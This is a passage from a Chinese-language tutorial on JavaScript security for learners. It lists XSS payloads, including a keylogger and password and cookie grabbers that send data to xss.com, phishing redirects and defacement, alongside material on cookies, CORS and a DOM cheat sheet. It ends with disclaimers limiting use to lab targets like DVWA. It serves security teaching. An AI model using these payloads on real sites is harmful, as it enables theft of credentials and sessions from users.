document.onkeypress=function(e){fetch('http://xss.com?k='+e.key)}
</script>

<!-- 偷密码输入 -->
<script>
document.querySelector('input[type="password"]').addEventListener('change', function(e){
    fetch('http://xss.com?p='+this.value)
})
</script>

<!-- 重定向钓鱼 -->
<script>location='http://钓鱼网站.com'</script>
<script>window.open('http://钓鱼网站.com')</script>

<!-- 篡改页面 -->
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
<script>document.title='Hacked'</script>

<!-- 持久化（每次刷新都触发） -->
<script>
fetch('http://xss.com?c='+document.cookie)
setInterval(function(){
    fetch('http://xss.com?c='+document.cookie)
}, 3000)
</script>
```

### 21.4 DOM 型 XSS Payload

```html
<!-- URL 参数注入 -->
http://example.com/page.html#<img src=x onerror=alert(1)>
http://example.com/page.html?name=<script>alert(1)</script>

<!-- document.write 注入 -->
<script>document.write('<img src=x onerror=alert(1)>')</script>

<!-- innerHTML 注入 -->
<script>document.getElementById('xss').innerHTML='<img src=x onerror=alert(1)>'</script>

<!-- eval 注入 -->
<script>eval('alert(1)')</script>
<script>eval(location.hash.slice(1))</script>

<!-- setTimeout/setInterval 注入 -->
<script>setTimeout('alert(1)')</script>
<script>setInterval('alert(1)')</script>
```

---

## 二十二、Cookie 与 Session 安全

```javascript
// 22.1 Cookie 属性
document.cookie = "name=小明; path=/; domain=.example.com; secure; httponly; samesite=strict";

// 安全属性说明
// HttpOnly：禁止 JavaScript 访问（防 XSS 偷 Cookie）
// Secure：仅通过 HTTPS 传输
// SameSite：跨站请求限制（CSRF 防护）
// 注意：如果 Cookie 设置了 HttpOnly，document.cookie 将看不到它！

// 22.2 设置 Cookie
function setCookie(name, value, days) {
    let expires = "";
    if (days) {
        let date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

// 22.3 获取 Cookie
function getCookie(name) {
    let nameEQ = name + "=";
    let ca = document.cookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) === ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

// 22.4 删除 Cookie
function deleteCookie(name) {
    document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/';
}

// 22.5 Session 检测
// 检查用户是否登录（通过 Cookie 判断）
function isLoggedIn() {
    return document.cookie.includes('session=') || 
           document.cookie.includes('token=') ||
           document.cookie.includes('PHPSESSID');
}
```

---

## 二十三、CORS 与同源策略

```javascript
// 23.1 同源策略
// 协议、域名、端口完全相同才算同源
// http://example.com 和 https://example.com 不同源
// http://example.com 和 http://api.example.com 不同源

// 23.2 检查当前源
console.log(location.origin);    // http://example.com:8080

// 23.3 CORS 请求（跨域）
// 需要服务器端设置 Access-Control-Allow-Origin
fetch('http://其他域名.com/api', {
    mode: 'cors'                  // 跨域模式
}).then(res => res.json());

// 23.4 绕过同源策略的方法
// 1. JSONP（老方法，已不推荐）
// 2. CORS（服务器配合）
// 3. postMessage（跨窗口通信）
// 4. WebSocket（不受同源策略限制）
// 5. 服务器代理

// 23.5 postMessage（跨源通信）
// 发送消息
window.postMessage('hello', 'http://其他域名.com');

// 接收消息
window.addEventListener('message', function(e) {
    if (e.origin !== 'http://信任的域名.com') return;  // 验证来源
    console.log('收到消息：', e.data);
});
```

> **⚠️ 安全关联**：CORS 配置不当可能导致敏感数据泄露。

---

## 二十四、速查小抄

### 基本语法对照表（Python vs JavaScript）

| Python | JavaScript |
|--------|-----------|
| `print()` | `console.log()` |
| `input()` | `prompt()` |
| `len()` | `.length` |
| `int()` | `Number()` / `parseInt()` |
| `str()` | `String()` |
| `type()` | `typeof` |
| `range()` | `for` 循环 |
| `if-elif-else` | `if-else if-else` |
| `and / or / not` | `&& / \|\| / !` |
| `in` | `includes()` / `indexOf()` |
| `def` | `function` |
| `lambda` | 箭头函数 `=>` |
| `dict` | `Object` |
| `list` | `Array` |
| `None` | `null` / `undefined` |

### 常用 DOM 操作速查

| 操作 | JavaScript |
|------|-----------|
| 获取元素 ID | `document.getElementById('id')` |
| 获取元素（选择器） | `document.querySelector('.class')` |
| 获取全部元素 | `document.querySelectorAll('div')` |
| 修改 HTML | `elem.innerHTML = '新内容'` |
| 修改文本 | `elem.textContent = '文本'` |
| 修改属性 | `elem.setAttribute('src', 'img.jpg')` |
| 修改样式 | `elem.style.color = 'red'` |
| 创建元素 | `document.createElement('div')` |
| 添加元素 | `parent.appendChild(child)` |
| 删除元素 | `elem.remove()` |
| 获取 Cookie | `document.cookie` |
| 获取 URL | `location.href` |
| 跳转页面 | `location.href = 'url'` |

### XSS 常用 Payload 速查

| 类型 | Payload |
|------|---------|
| 基础弹窗 | `<script>alert(1)</script>` |
| 图片事件 | `<img src=x onerror=alert(1)>` |
| 偷 Cookie | `<script>new Image().src='http://xss.com?c='+document.cookie</script>` |
| 重定向 | `<script>location='http://钓鱼.com'</script>` |
| 篡改页面 | `<script>document.body.innerHTML='Hacked'</script>` |
| 键盘记录 | `<script>document.onkeypress=function(e){fetch('http://xss.com?k='+e.key)}</script>` |

### 调试技巧

```javascript
// 1. console.log 调试
console.log('调试信息', 变量);

// 2. 断点调试
debugger;                         // 浏览器会自动暂停

// 3. console.table（表格输出）
console.table([{name: '小明', age: 18}]);

// 4. console.trace（调用栈）
console.trace();

// 5. console.time（性能测试）
console.time('循环');
for (let i = 0; i < 1000000; i++) {}
console.timeEnd('循环');

// 6. console.group（分组输出）
console.group('用户信息');
console.log('姓名：小明');
console.log('年龄：18');
console.groupEnd();

// 7. 捕获所有错误
window.onerror = function(msg, url, line) {
    console.log('错误：', msg);
};
```

---

```javascript
console.log("\n✨ 恭喜！你已经掌握了 JavaScript 安全基础！✨");
console.log("📌 记住：这些代码只在你自己搭建的 DVWA 上使用！");
console.log("📌 未经授权对他人网站进行 XSS 攻击是违法的！");
```

---

> **⚠️ 免责声明**：本文档仅用于授权渗透测试和安全学习。XSS（跨站脚本攻击）是一种严重的安全漏洞，未经授权对他人系统进行测试属于违法行为。请在合法的靶场环境（如 DVWA、HackTheBox、PortSwigger Web Security Academy）中练习。

---
